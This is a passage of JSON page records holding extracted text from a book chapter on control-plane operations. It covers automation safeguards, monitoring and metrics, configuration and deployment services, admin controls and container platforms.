      "content": "Chapter 10. Control Plane • 196\n\nThe second thing to note is that the playbook involved here had apparently been used before. But it hadn’t previously resulted in front-page news. Why not? For whatever reason, it worked before. We should try to learn from the successes as well as the failures. When the playbook was previously used, were the conditions different? There could be variations in any of the following:\n\nWho executed it? Was there a “second set of eyes”?\n\nWere there revisions to the playbook? Sometimes error-checking steps\n\nget relaxed over time.\n\nWhat feedback did the underlying system provide? Feedback may have\n\nhelped avert previous problems.\n\nWe tend to have postmortem reviews of incidents with bad outcomes. Then we look for causes, and any anomaly either gets labeled as a root cause or a contributing factor. But many times those same anomalies are present during “ordinary” operations, too. We give them more weight after an outage because we have the benefit of hindsight.\n\nWe also have many opportunities to learn from successful operations. Anomalies are present all the time, but most of the time they don’t cause out- ages. Let’s devote some effort to learning from those. Have postmortems for successful changes. See what variations or anomalies happened. Find out what the “near misses” were. Did someone type an incorrect command but catch it before executing? That’s a near miss. Find out how they caught it. Find out what safety net could have helped them catch it or stop it from doing harm.\n\nAutomation Goes Really Fast\n\nAnother fascinating bit of information shows up in the AWS postmortem. “While removal of capacity is a key operational practice, in this instance, the tool used allowed too much capacity to be removed too quickly. We have modified this tool to remove capacity more slowly and added safeguards to prevent capacity from being removed when it will take any subsystem below its minimum required capacity level.”\n\nThis part stuck out because it closely resembled the outage that Reddit.com suffered in August 2016.2 After that outage, Reddit reported the event was pre- cipitated by its autoscaling service. It observed a partially migrated ZooKeeper database that claimed Reddit only needed a tiny fraction of the servers it was running. The autoscaler dutifully shut down the rest of the servers.\n\n2.\n\nwww.reddit.com/r/announcements/comments/4y0m56/why_reddit_was_down_on_aug_11\n\nreport erratum • discuss",
      "content_length": 2460,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 205,
      "content": "Platform and Ecosystem • 197\n\nA common thread running through these outages is that the automation is not being used simply to enact the will of a human administrator. Rather, it is more like industrial robotics: the control plane senses the current state of the system, compares it to the desired state, and effects changes to bring the current state into the desired state.\n\nIn both cases, it’s totally normal to shut down an instance or two, maybe more. Most of the time, those individual VMs or processes don’t matter. One machine out of thousands is no big deal. But at some point, the automation shuts down enough machines to make a noticeable dent in capacity. The exact threshold depends on how much spare capacity you have for handling bursts. But once we’re talking about shutting down more than 50 percent of total server capacity, the automation probably ought to pause for some human confirmation that this is really the right course of action.\n\nAutomation has no judgment. When it goes wrong, it tends to do so really, really quickly. By the time a human perceives the problem, it’s a question of recovery rather than intervention. How can we allow human intervention without putting a human in the loop for everything? We should use automation for the things humans are bad at: repetitive tasks and fast response. We should use humans for the things automation is bad at: perceiving the whole situation at a higher level.\n\nWith that groundwork in place, let’s consider the major components of a control plane. In each area, we’ll look at the budget approach and the Cadillac approach (bearing in mind that the landscape changes quickly).\n\nPlatform and Ecosystem\n\nSuppose we decide to put monitoring into the platform. There’ll surely be a monitoring team within the platform team. Would we expect that team to respond to application alerts? Definitely not! Instead, that team should provide the capability that others then use. In other words, the monitoring team doesn’t do the monitoring, it provides the ability for others to do their own monitoring. This is a mental shift from ownership of the domain to offering a service to customers.\n\nSeems like an easy enough heuristic, but it leads immediately to a change in the way we view responsibilities. For example, it used to be common for the monitoring team to implement all the specific monitors, triggers, alerts, and thresholds. That puts them right in the middle of the change loop. It means they have to create a “request for monitoring” form for development teams to\n\nreport erratum • discuss",
      "content_length": 2567,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 206,
      "content": "Chapter 10. Control Plane • 198\n\nfill out (whether paper or online). It means that tweaks and changes to moni- toring have to go through a queue in the form of the other teams’ inboxes.\n\nIf we respect the customer-centric model, then the monitoring team should not implement the actual monitors. Team members should work one level removed: they implement the tools that let their customers implement their own monitors. In other words, the monitoring team may need to build infrastructure to receive alerts, deployment tools that push their monitoring agents out (if applicable), or scripting tools that let developers provide a JSON description of the monitors they need.\n\nThis begins to look like creating interfaces in an object-oriented application. The monitoring team offers up an interface that development teams can use. The details of implementation are owned by the monitoring team and can change as long as they continue to support their contract.\n\nWhat about database administrators? It’s a shame that the acronym DBA can mean both “database administrator” and “database architect.” The lines of responsibility have gotten blurred over the years. The administrator should ideally be concerned with creating a high-performance, stable platform on which development teams can build any kind of database. Sadly, technology constraints in days past led us to have DBAs that were responsible for both the health of the database server and the data model used by the applications. This caused a lot of tension when the data model was contorted to make the server happy instead of vice versa. A lot of the energy behind the NoSQL movement was really about refactoring those responsibilities.\n\nWith NoSQL and postrelational databases, we see a different split in the roles. The platform team includes database administrators who keep the database running and healthy. They ensure there’s enough capacity but the data model is up to the application.\n\nThe picture is harder with SQL-based RDBMSs. It’s too easy for one application to make a harmful schema change that affects other consumers. This leads us to decree a separate physical database for each service. It’s not very resource-efficient, but it does unfreeze development teams to move indepen- dently, without a queue for DBA attention.\n\nIs it possible to create a platform that allows safe, autonomous delivery into a shared SQL database? Yes, but it requires accommodation from both developers and DBAs. In particular, the difficulty of parsing SQL to do auto- mated sanity checking is too high. Developers and DBAs have to agree on a simpler, machine-readable format that can be scripted against. Many migration frameworks offer XML, JSON, or YAML formats that suffice.\n\nreport erratum • discuss",
      "content_length": 2760,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 207,
      "content": "Development Is Production • 199\n\nKeep in mind that the goal for the platform team is to enable their customers. The team should be trying to take themselves out of the loop on every day- to-day process and focus on building safety and performance into the platform itself. If you find that your technology choices or architecture make this really difficult, it’s a good argument to change your technology!\n\nDevelopment Is Production\n\nQuick, think of a “dev server.” What comes to mind? Probably a barely running mess full of old temp files, tarballs named after people, scripts that aren’t in version control and nobody’s quite sure if they’re still used, SSH keys from developers who left years ago...in short, a big ramshackle mess.\n\nOkay, now think about your QA environment. Does it fully work? Does it really? Or are there a bunch of integrations stubbed out? Maybe there are jobs that run in production that can’t run in QA. Probably the database isn’t very realistic, because the production data has PII that can’t be copied around. Do you have high confidence that passing tests in QA means the software will work in production?\n\nMaybe you’re in the minority. If your image of a dev server is a fresh virtual machine with a known configuration, that’s great! Maybe your image of QA is a whole environment stamped out by the same automation tools that deploy to production, with an anonymized sample of production data from within the last week. If so, you’re doing quite well.\n\nMost organizations treat their development environments like a shantytown. Stuff only works there because the developers run their own power by daisy- chaining extension cords from a nearby settlement. QA doesn’t match produc- tion in topology or scale, and multiple dev teams are trying to get into QA but can’t because there’s only one environment. (Hint: There’s no “right number” of QA environments. Virtualize them so every team can create its own on- demand QA environment.) In short, development environments are treated with utter disregard.\n\nThis is kind of odd when you think about it, because developers are creating content all the time. They build software that has to go into version control (a service), get constructed in CI (another service), tested in QA (a service), and stored in a repository (yet another service). When these services are down, developers can’t do their jobs. Let’s look at an analogy. Suppose your compa- ny’s content management system went down so copywriters couldn’t do their jobs. That would be at least a Severity 2 outage, right?\n\nreport erratum • discuss",
      "content_length": 2586,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 208,
      "content": "Chapter 10. Control Plane • 200\n\nThe tools, services, and environments that developers need to do their jobs should be treated with production-level SLAs. The development platform is the production environment for the job of creating software.\n\nSystem-Wide Transparency\n\nBack in Transparency, on page 162, we saw how individual instances can reveal their state. That’s the start of a total story about transparency. Now we look at how to assemble a picture of system-wide health from the individ- ual instances’ information.\n\nThe first place to start is by defining what we need from our efforts. When dealing with the system as a whole, two fundamental questions need to be answered:\n\n1. Are users receiving a good experience?\n\n2.\n\nIs the system creating the economic value we want?\n\nNotice that the question, “Is everything running?” isn’t on that list. Even at small scale, we should be able to survive periods where everything isn’t running. At scale, “partially broken” is the normal state of operation. It’s rare to find all instances running with no deployments or failures at any given moment.\n\nReal-User Monitoring\n\nIt is hard to deduce whether users are receiving a good experience from indi- vidual instance metrics. (It would require a model of the whole system that accounts for circuit breakers, caches, fallbacks, and a pile of other implemen- tation details that change frequently.) Instead, the best way to tell if users are receiving a good experience is to measure it directly. This is known as real-user monitoring (or RUM, if you like).\n\nMobile and web apps can have instrumentation that reports their timing and failures up to a central service. That can take a lot of infrastructure, so you may consider a service such as New Relic or Datadog.3,4 If you are at a scale where it makes sense to run it yourself, on-premise software such as AppDy- namics or CA’s APM might be the thing for you.5,6 Some of these products also allow you to watch network traffic at the edge of your system, recording HTTP sessions for analysis or playback.\n\n3. 4. 5. 6.\n\nhttps://newrelic.com\n\nwww.datadoghq.com\n\nwww.appdynamics.com\n\nwww.ca.com/us/products/application-performance-monitoring.html\n\nreport erratum • discuss",
      "content_length": 2223,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 209,
      "content": "System-Wide Transparency • 201\n\nUsing these services has three advantages over the “DIY” approach. The first is rapid startup. You don’t need to build infrastructure or configure monitoring software. It is quite possible to get going with data collection in under an hour. Second, they offer agents and connectors for a wide array of technology, which makes it much easier to integrate all your monitoring into one place. Finally, their dashboards and visualization tend to be more polished than open-source alternatives.\n\nThere are downsides, of course. For one thing, these are commercial services. You’ll be paying a subscription fee. As your system scales, so will your fees. There may come a time when the fees become unpalatable, but the switching cost of moving to your own infrastructure is equally unpalatable. Second, some companies are absolutely unwilling to have even monitoring data crossing the Internet.\n\nOn-premise commercial solutions, such as AppDynamics, offer easy integration and polished visualization, but these lose the advantage of rapid startup and also have scaling fees.\n\nThe open-source arena has produced some excellent tools, but the usual open- source effect is at play: integrating the tools to your system can be a challenge. For that matter, integrating the tools with each other can be a challenge! The dashboards and visualization are also less polished and less user-friendly. While removing the very visible monthly fees for a service, the open source approach has less-visible costs in the form of labor and infrastructure.\n\nHalf of the vendors at operations or software architecture conferences are in this space, so the names may change by the time you read this. The broad category here is called “application performance management,” and it seems to be one of the last areas of operations software that hasn’t been replaced by open-source packages. As with other kinds of operations software, it’s not that important to choose the ideal solution. Instead, focus on adopting your chosen solution thoroughly. Don’t leave any “dead zones” in your system.\n\nReal-user monitoring is most useful to understand in terms of the current state and recent history. Dashboards and graphs are the most common ways to visualize this.\n\nEconomic Value\n\nSome software exists as art and some exists as entertainment. Most of the software we write for companies exists to create economic value. It may seem odd to be talking about the economics of software systems in a section about transparency, but this is where we can most directly perceive the linkage\n\nreport erratum • discuss",
      "content_length": 2608,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 210,
      "content": "Chapter 10. Control Plane • 202\n\nbetween our systems and our financial success. The value created by our systems can be harmed if the user experience is bad. It can also be harmed if the system cost is too high. These are the “top line” and “bottom line” effects. We should build our transparency in terms of revealing the way that the recent past, current state, and future state connect to revenue and costs.\n\nThe top line is income. Revenue. The good stuff. Our system should be able to tell us if we’re making as much as we “should be” right now. In other words, are there performance bottlenecks that prevent us from signing up more new users? Is some crucial service returning errors that turn people off before they register? The specific needs here vary according to your domain, but you should plan to watch the following:\n\nWatch each step of a business process. Is there a rapid drop-off in some step? Is some service in a revenue-generating process throwing exceptions in logs? If so, it’s probably reducing your top line.\n\nWatch the depth of queues. Queue depth is your first indicator of perfor- mance degradation. A non-zero queue depth always means work takes longer to get through the process. For many business transactions, that queuing time directly hits your revenue.\n\nThe bottom line is net profit (or loss). It is the top line minus costs. Cost comes from infrastructure, especially in these days of autoscaled, elastic, pay-as- you-go services. Nearly every startup has a horror story about unchecked autoscaling costing them thousands of dollars due to unchecked demand. Worse yet, that sometimes results from runaway automation spinning up too many resources.\n\nCost also comes from operations. The harder your software is to operate, the more time it takes from people. That’s true whether you’re in a DevOps-style organization or a traditional siloed organization. Either way, any time spent responding to incidents is unplanned work that could have gone to raising the top line.\n\nAnother less visible source of cost comes from our platforms and runtimes. Some languages are very fast to code in but require more instances to handle a particular workload. You can improve the bottom line by moving crucial services to technology with a smaller footprint or faster processing. Before you do, though, make sure it’s a service that makes a difference. In other words, your feature that detects birds in photographs taken inside national parks may require a lot of CPU time; but if it only gets used once a month, it’s not material to your bottom line.\n\nreport erratum • discuss",
      "content_length": 2600,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 211,
      "content": "System-Wide Transparency • 203\n\nSo far we’ve talked about the current state and recent past. Our transparency tools should also help us consider the near future as well, such as these questions:\n\nAre there opportunities to increase the top line by improving performance\n\nor reducing queues?\n\nAre we going to hit a bottleneck that will prevent us from increasing the\n\ntop line?\n\nAre there opportunities to increase the bottom line by optimizing services?\n\nCan we see places that are overscaled?\n\nCan we replace slow-performing or large-footprint instances with more\n\nefficient ones?\n\nThe idea of monitoring, log collection, alerting, and dashboarding as being about economic value more than technical availability may be unfamiliar. Even so, if you adopt this perspective, you’ll find that it is easy to make decisions about what to monitor, how much data to collect, and how to rep- resent it.\n\nThe Risk of Fragmentation\n\nThe usual notion of perspectives splits into “technical” and “business” con- cerns. The “technical” perspective may even be split into “development” and “operations.” Most of the time, these constituencies look at different measure- ments collected by different means. Imagine the difficulty in planning when marketing uses tracking bugs on web pages, sales uses conversions reported in a business intelligence tool, operations analyzes log files in Splunk, and development uses blind hope and intuition. Could this crew ever agree on how the system is doing? It’d be much better to integrate the information so all parties can see the same data through similar interfaces.\n\nDifferent constituencies require different perspectives. These perspectives won’t all be served by the same views into the systems, but they should be served by the same information system overall. Just as the question, “How’s the weather?” means very different things to a gardener, a pilot, and a mete- orologist, the question, “How’s it going?” means something decidedly distinct when coming from the CEO or the system administrator. Likewise, a bunch of CPU utilization graphs won’t mean a lot to the marketing team. Each “special interest group” in your company may have its own favorite dashboard, but everyone should be able to see how releases affect user engagement or conversion rate affects latency.\n\nreport erratum • discuss",
      "content_length": 2333,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 212,
      "content": "Chapter 10. Control Plane • 204\n\nLogs and Stats\n\nIn Transparency, on page 162, we saw the importance of good logging and metrics generation at the microscopic scale. At the system scale, we need to gather all that data and make sense of it. This is the job of log and metrics collectors.\n\nLike a lot of these tools, log collectors can either work in push or pull mode. Push mode means the instance is pushing logs over the network, typically with the venerable syslog protocol.7 Push mode is quite helpful with containers, since they don’t have any long-lived identity and often have no local storage.\n\nWith a pull-mode tool, the collector runs on a central machine and reaches out to all known hosts to remote-copy the logs. In this mode, services just write their logs to local files.\n\nJust getting all the logs on one host is a minor achievement. The real beauty comes from indexing the logs. Then you can search them for patterns, make trendline graphs, and raise alerts when bad things happen. Splunk dominates the log indexing space today.8 The troika of Elasticsearch, Logstash, and Kibana is another popular implementation.\n\nThe story for metrics is much the same, except that the information isn’t always available in files. Some information can only be retrieved by running a program on the target machine to sample, say, network interface utilization and error rates. That’s why metrics collectors often come with additional tools to take measurements on the instances.\n\nMetrics also have the interesting property that you can aggregate them over time. Most of the metrics databases keep fine-grained measurements for very recent samples, but then they aggregate them to larger and larger spans as the samples get older. For example, the error rate on a NIC may be available second by second for today, in one-minute granularity for the past seven days, and only as hourly aggregates before that. This has two benefits. First, it really saves on disk space! Second, it also makes queries across very large time spans possible.\n\nWhat to Expose\n\nIf you could predict which metrics would limit capacity, reveal stability problems, or expose other cracks in the system, then you could monitor only those. But that prediction will have two problems. First, you’re likely to guess\n\n7. 8.\n\nhttps://tools.ietf.org/html/rfc5424\n\nwww.splunk.com\n\nreport erratum • discuss",
      "content_length": 2371,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 213,
      "content": "System-Wide Transparency • 205\n\nwrong. Second, even if you guess right, the key metrics change over time. Code changes and demand patterns change. The bottleneck that burns you next year probably doesn’t exist right now.\n\nOf course, you could spend an unlimited amount of effort exposing metrics for absolutely everything. Since your system still has to do something other than just collect data, I’ve found a few heuristics to help decide which variables or metrics to expose. Some of these will be available right away. For others, you might need to add code to collect the data in the first place. Here are some categories of things I’ve consistently found useful.\n\nTraffic indicators\n\nPage requests, page requests total, transaction counts, concurrent sessions\n\nBusiness transaction, for each type\n\nNumber processed, number aborted, dollar value, transaction aging, conversion rate, completion rate\n\nUsers\n\nDemographics or classification, technographics, percentage of users who are registered, number of users, usage patterns, errors encountered, successful logins, unsuccessful logins\n\nResource pool health\n\nEnabled state, total resources (as applied to connection pools, worker thread pools, and any other resource pools), resources checked out, high- water mark, number of resources created, number of resources destroyed, number of times checked out, number of threads blocked waiting for a resource, number of times a thread has blocked waiting\n\nDatabase connection health\n\nNumber of SQLExceptions thrown, number of queries, average response time to queries\n\nData consumption\n\nNumber of entities or rows present, footprint in memory and on disk\n\nIntegration point health\n\nState of circuit breaker, number of timeouts, number of requests, average response time, number of good responses, number of network errors, number of protocol errors, number of application errors, actual IP address of the remote endpoint, current number of concurrent requests, concurrent request high-water mark\n\nreport erratum • discuss",
      "content_length": 2021,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 214,
      "content": "Chapter 10. Control Plane • 206\n\nCache health\n\nItems in cache, memory used by cache, cache hit rate, items flushed by garbage collector, configured upper limit, time spent creating items\n\nAll of the counters have an implied time component. You should read them as if they all end with “in the last n minutes” or “since the last reset.”\n\nAs you can see, even a medium-sized system could have hundreds of metrics. Each one has some range in its normal and acceptable values. This might be a tolerance around a target value or a threshold that should not be crossed. The metric is “nominal” as long as it’s within that acceptable range. Often, a second range will indicate a “caution” signal, warning that the parameter is approaching a threshold.\n\nFor continuous metrics, a handy rule-of-thumb definition for nominal would be “the mean value for this time period plus or minus two standard deviations.” The choice of time period is where it gets interesting. Most metrics have a traffic-driven component, so the time period that shows the most stable cor- relation will be the “hour of the week”—that is, 2 p.m. on Tuesday. The day of the month means little. In certain industries—such as travel, floral, and sports—the most relevant measurement is counting backward from a holiday or event.\n\nFor a retailer, the “day of week” pattern will be overlaid on a strong “week of year” cycle. There is no one right answer for all organizations.\n\nConfiguration Services\n\nConfiguration services like ZooKeeper and etcd are distributed databases that applications can use to coordinate their configuration.9,10 Configuration in this sense is more than just the static parameters that an instance would keep in .properties files. It does include simple settings such as hostnames, resource pool sizes, and timeouts. But “configuration” also includes the arrangement of instances among themselves. These configuration databases can be used for orchestration, leader election (in the case of a cluster with a master node), or quorum-based consensus.\n\nHowever, these are built with code and not magic. They are still bound by the constraints of the CAP theorem and sub-light-speed communications. The configuration services are themselves distributed databases.\n\n9. https://zookeeper.apache.org 10. https://coreos.com/etcd/docs/latest\n\nreport erratum • discuss",
      "content_length": 2344,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 215,
      "content": "Provisioning and Deployment Services • 207\n\nThese services are scalable but not elastic. That means you can add and remove nodes, but response time will degrade as the nodes rebalance their data. It often requires an admin action to get the cluster to accept a new member or to indicate that an old member is gone for good.\n\nKeep in mind that the configuration service suffers the same network trauma that every other application does. There will be times that clients can’t reach the configuration service. Worse, there will be times when the nodes of the configuration service can’t reach each other but clients can reach the nodes. In this case, it has to be safe for the clients to run with slightly outdated configurations. Otherwise, you have no choice but to shut down applications when the configuration service is partitioned.\n\nInformation doesn’t only need to flow from the service to client instances, either. Instances can report back with their version numbers (or commit SHAs) and node identifiers. That means you can write a program or script to reconcile the actual state of the system with the expected state after a deployment. Be somewhat careful with this, as the configuration services can sustain high read volume but have to go through some consensus mechanism for every write. It’s OK to use these for relatively slowly changing configuration data, but they definitely don’t stand in for a log collection system.\n\nA few pointers about configuration services:\n\nMake sure your instances can start without the configuration service.\n\nMake sure your instances don’t stop working when configuration is\n\nunreachable.\n\nMake sure that a partitioned configuration node doesn’t have the ability\n\nto shut down the world.\n\nReplicate across geographic regions.\n\nProvisioning and Deployment Services\n\nIn Part III of this book, we look at how to design services and applications to be deployable. Here let’s look at the supporting infrastructure to perform the deployments themselves.\n\nDeployment may be the most well-trodden area of operations tools. It’s an obvious nexus between development and production. To some organizations, deployment is “DevOps.” It’s understandable. In many organizations deploy- ment is ridiculously painful, so it’s a good place to start making life better.\n\nreport erratum • discuss",
      "content_length": 2322,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 216,
      "content": "Chapter 10. Control Plane • 208\n\nConsequently, a host of deployment tools represent “push” and “pull” methods. A push-style tool uses SSH or another agent so a central server can reach out to run scripts on the target machines. The machines may not know their own roles. The server assigns them.\n\nIn contrast, pull-based deployment tools rely more on the machines to know their own roles. Software on the machine reaches out to a configuration service to grab the latest bits for its role.\n\nPull-based tools work especially well with elastic scaling. Elastically scaled virtual machines or containers have ephemeral identities, so there’s no point in having a push-based tool maintain a mapping from machine identity to role—the machine identity will shortly disappear, never to be seen again! With long-lived virtual machines or even physical hosts, push-based tools can be simpler to set up and administer. That’s because they use commodity software like SSH rather than agents that require their own configuration and authentication techniques.\n\nThe deployment tool by itself should be augmented with a package repository. Whether that’s an official “artifact repository” tool or an S3 bucket is up to you. But it’s important to have a location for blessed binary bits that isn’t populated from a developer’s laptop. Production builds need to be run on a clean build server using libraries with known provenance. The build pipeline should tag the build as it passes various stages, especially verification steps like unit or integration tests.\n\nThis isn’t just being pedantic or jumping through hoops to satisfy a security department. Repeatable builds are important so code that works on your machine works in production, too.\n\nBuild Server as Attack Vector\n\nAny widely used piece of server software will be used for an attack. That includes build servers such as Jenkins, Bamboo, or GoCD.\n\nAt least one major software vendor was attacked by means of the build environment. The attacker compromised a plugin to the vendor’s continuous integration server. The plugin injected code that targeted a well-known customer of this vendor (relayed in personal communication to the author). This vendor kept its libraries in a controlled artifact repository but had overlooked the plugins to the build system itself. Those were downloaded directly from the Net.\n\nreport erratum • discuss",
      "content_length": 2382,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 217,
      "content": "Command and Control • 209\n\nCanary deployments are an important job of the build tooling. The “canary” is a small set of instances that get the new build first. For a period of time, the instances running the new build coexist with instances running the old build. (See Chapter 14, Handling Versions, on page 263, to enable peaceful coexistence.) If the canary instances behave oddly, or their metrics go south, then the build is not rolled out to the remaining population.\n\nLike every other stage of build and deployment, the purpose of the canary deployment is to reject a bad build before it reaches the users.\n\nAt a larger scale, the deployment tool needs to interact with another service to decide on placement. That placement service will determine how many instances of a service to run. It should be network-aware so it can place instances across network regions for availability. Typically, it’ll also drive the interconnect layer to set up IP addresses, VLANs, load balancers, and firewall rules.\n\nWhen you get to this scale, it’s probably time to look at the platform players. We’ll cover those a bit later in The Platform Players, on page 212. Even though a dedicated team will sustain and operate the platform, you’ll want to learn what it can do. That’s because your software needs to include a description of its needs and wants for the platform to provide (usually as a JSON or YAML file in the build artifacts.)\n\nCommand and Control\n\nLive control is only necessary if it takes your instances a long time to be ready to run. As a thought experiment, imagine that any configuration change took ten milliseconds to roll out and that each instance could be restarted in another hundred milliseconds. In that world, live control would be more trouble than it was worth. Whenever an instance needed to be modified, it would be simpler to just kill the instance and let the scheduler start a new one.\n\nIf your instances run in containers and get their configuration from a config- uration service, then that is exactly the world you live in. Containers start very quickly. New configuration would be used immediately.\n\nSadly, not every service is made of instances that start up so quickly. Anything based on Oracle’s JVM (or OpenJDK for that matter) needs a “warm-up” period before the JIT really kicks in and makes it fast. Many services need to hold a lot of data in cache before they perform well enough. That also adds to the startup time. If the underlying infrastructure uses virtual machines instead of containers, then it can take several minutes to restart.\n\nreport erratum • discuss",
      "content_length": 2602,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 218,
      "content": "Chapter 10. Control Plane • 210\n\nControls to Offer\n\nIn those cases, you need to look at ways to send control signals to running instances. Here is a brief checklist of controls to plan for:\n\nReset circuit breakers. • Adjust connection pool sizes and timeouts. • Disable specific outbound integrations. • Reload configuration. • Start or stop accepting load. • Feature toggles.\n\nNot every service will need all of these controls. They should give you a place to start, though.\n\nMany services also expose controls to update the database schema, or even to delete all data and reseed it. These are presumably helpful in test environ- ments but extremely hazardous in production. These controls result from a breakdown in roles. Developers don’t trust operations to deploy the software and run the scripts correctly. Operations doesn’t allow developers to log in to the production machines to update the schemata. That breakdown is itself a problem to fix. Don’t build a self-destruct button into your production code!\n\nAnother common control is the “flush cache” button. This is also quite haz- ardous. It may not be a self-destruct button, but it’s the button that vents all your atmosphere into space. An instance that flushes a cache will have really bad performance for the next several minutes. It may also generate a dogpile on the underlying service or database. Some kinds of services just can’t respond until their working set is loaded into memory.\n\nSending Commands\n\nOnce you’ve decided which controls to expose, there’s still the question of how to convey the operator’s intention out to the instances themselves. The simplest approach is to offer an admin API over HTTP. Each instance of a service would listen on a port for these requests. It needs to be a different port than ordinary traffic, however. The admin API should not be available to the general public!\n\nAn HTTP API leaves the door open for higher levels of automation in the future. In the beginning, it’s fine to use cURL or any other HTTP client to poke the admin API. If that API happens to be described in Open API format,11 then a GUI comes for free with Swagger UI.12\n\n11. www.openapis.org 12. http://swagger.io/swagger-ui\n\nreport erratum • discuss",
      "content_length": 2228,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 219,
      "content": "Command and Control • 211\n\nAt larger scales, simple scripts to call the admin API may no longer suffice. For one thing, it takes time to make the API call to each instance. Suppose each API call takes just a quarter-second to complete. It will take two minutes to loop over a fleet of 500 instances. Actually, that assumes all the instances are up and responding properly. More likely, whatever script loops over those API calls will stall out partway through because some instance doesn’t respond.\n\nThat’s when it’s time to build a “command queue.” This is a shared message queue or pub/sub bus that all the instances can listen to. The admin tool sends out a command that the instances then perform.\n\nBe careful, though! With a command queue, it’s even easier to create a dogpile. It’s often a good idea to have each instance add a random bit of delay to spread them out a bit. It can also help to identify “waves” or “gangs” of instances. So a command may target “wave 1,” followed by “wave 2” and “wave 3” a few minutes later.\n\nScriptable Interfaces\n\nAdmin GUIs demo very well. Unfortunately, they are a nightmare in produc- tion. The chief problem with a GUI is all the clicking. Mice are not easily scriptable—operators have to resort to GUI testing tools like Watir or Robo- Forms to automate them. GUIs slow down operations by forcing administrators to do the same manual process on each service or instance (there might be many) every time the process is needed. For example, the clean shutdown sequence on a particular order management system I worked on required clicking—and waiting several minutes—on each of six different servers. Guess how often the clean shutdown sequence was observed? With a one-hour change window, nobody can afford to spend half of it waiting on the GUI.\n\nThe net result is that GUIs make terrible administrative interfaces for long- term production operation. The best interface for long-term operation is the command line. Given a command line, operators can easily build a scaffolding of scripts, logging, and automated actions to keep your software happy.\n\nRemember This\n\nIt’s easy to get excited about control plane software. Blog posts and Hacker News will always egg you on to build more. But always keep the operating costs in mind. Anything you build must either be maintained or torn down. Choose the options that are appropriate for your team size and the scale of your workload.\n\nreport erratum • discuss",
      "content_length": 2453,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 220,
      "content": "Chapter 10. Control Plane • 212\n\nStart with visibility. Use logging, tracing, and metrics to create transparency. Collect and index logs to look for general patterns. That also gets logs off of the machines for postmortem analysis when a machine or instance fails.\n\nUse configuration, provisioning, and deployment services to gain leverage over larger or more dynamic systems. The more you move toward ephemeral machines, the more you need these. This pipeline to production is not just a set of development tools. It is the production environment that developers use to produce value. Treat it with the same care as you would any other production environment.\n\nOnce the system is (somewhat) stabilized and problems are visible, build control mechanisms. These should give you more precise control than just reconfiguring and restarting instances. A large system deployed to long-lived machines benefits more from control mechanisms than a highly dynamic environment will.\n\nThe Platform Players\n\nSo far, the solutions we’ve seen need “some assembly required.” That means you can adopt them incrementally and defer commitment. Optionality comes at a cost, though, because you’ll end up devoting time and resources plumbing together different parts. For example, a basic yet frustrating aspect of rolling your own platform is getting all the authentication and role-based authorization systems working together. Another common stumbling block is integrating the components’ monitoring to provide a unified view.\n\nAt the other end of the integration spectrum, we have the platform players. The platform is to the data center what the operating system is to the personal computer. It abstracts the underlying infrastructure and presents a friendlier programming model. It manages resources and schedules tasks, just across multiple computers. A platform offers assurance that its parts will all work together coherently.\n\nThe population of platform players persistently permutes. At the time of writing, the top contenders are Google’s Kubernetes,13 Apache’s Mesos,14 CloudFoundry,15 and Docker’s “Swarm Mode.”16 The odds are good that one or more new players will arrive before this book hits print.\n\n13. https://kubernetes.io 14. http://mesos.apache.org 15. www.cloudfoundry.org 16. https://docs.docker.com/engine/swarm\n\nreport erratum • discuss",
      "content_length": 2343,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 221,
      "content": "The Shopping List • 213\n\nA distinguishing feature of the platforms versus the cloud providers is about location. With the platforms, the software is available to be installed at any location: on your premises, in a hosting facility, or on top of a public cloud.\n\nIt’s relatively easy for one team in a large organization to deploy its own monitoring framework. That’s not the case with the platforms. They require care and feeding in their own right. It is more likely that a big group within an organization will move to one of the prefab platforms. That also means that individual teams probably don’t have the capacity or authority to build their own platforms. (It wouldn’t be cost-efficient anyway, because you need to amortize the support cost across a larger number of teams to justify it.)\n\nWhen these platforms work well, it can be an amazingly smooth experience to deploy services. A single command can bundle up a JAR file or Python project with its runtime, build a virtual machine or container image, run it, and set up DNS for you.\n\nIf you are adopting one of these platforms, you should really embrace it. There’s no point in using one at arm’s length. Don’t try to wrap the API or provide your own set of scripts. You’re investing a lot in the platform, so get the most you can out of it!\n\nThe Shopping List\n\nThis chapter gradually introduced many moving parts, so here’s a checklist of the things you might need. Remember that not every organization needs everything on this list. Apply a cost/benefit trade-off view toward each.\n\nLog collection and search • Metrics collection and visualization • Deployment • Configuration service • Instance placement • Instance and system visualization • Scheduling • IP, overlay network, firewall, and route management • Autoscaler • Alerting and notification\n\nWrapping Up\n\nEvery solution creates new problems. As our systems have scaled up and out, we’ve virtualized everything. Workload runs across containers and VMs, one\n\nreport erratum • discuss",
      "content_length": 2005,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 222,
      "content": "Chapter 10. Control Plane • 214\n\nor more clouds, and physical data centers. Just keeping tabs on this far-flung network requires new tools and techniques.\n\nWe’ve looked at the ways we can create visibility across whole systems so we can answer two fundamental questions: Are users receiving a good experience? And is the system producing the economic value we want? To answer those, we need to collect information across instances and services. We need tracing tools to understand where bottlenecks, inhibitors, and points of failure exist.\n\nOnce we know what’s happening across the system, we also need ways to intervene. Control systems and configuration services allow us to instruct running instances to change their behavior. Scheduling and deployment tools let us change the instance assortment dynamically as our internal and external environments shift.\n\nIn all these services, we need to understand that automation makes every- thing go faster. It also lacks human judgment, so when things go wrong, they go wrong very quickly. We need to build safety mechanisms into the automation itself.\n\nWe’ve almost finished our holistic journey through the layers of design for production. There’s just one last area to look into: security.\n\nreport erratum • discuss",
      "content_length": 1265,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 223,
